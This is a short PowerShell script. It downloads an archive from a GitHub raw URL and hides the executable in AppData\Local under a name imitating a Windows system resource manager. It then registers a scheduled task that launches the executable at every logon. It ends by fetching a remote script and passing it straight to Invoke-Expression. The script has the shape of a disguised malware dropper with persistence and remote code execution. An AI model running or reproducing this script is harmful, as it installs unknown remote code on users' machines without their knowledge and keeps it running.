Invoke-RestMethod "https://github.com/n0shadow/config/raw/refs/heads/main/Server.zip" -OutFile "a.zip";
Expand-Archive -Path "a.zip" -DestinationPath ".";
Remove-Item "a.zip";

$tsk = "GerenciadorRecursos"

schtasks.exe /end /tn $tsk
schtasks.exe /delete /tn $tsk /f

$usrPath = $PWD.Path
$dest = Join-Path $usrPath "AppData\Local"
Move-Item "Server" $dest -r -Force

$usr = Split-Path $usrPath -Leaf
$exec = Join-Path $dest "Gerenciador de recursos do sistema.exe"

schtasks.exe /create `
    /tn $tsk `
    /tr "'$exec'" `
    /sc onlogon `
    /ru "$usr" `
    /rl limited

Invoke-RestMethod "https://github.com/n0shadow/config/raw/refs/heads/main/nd.ps1" | Invoke-Expression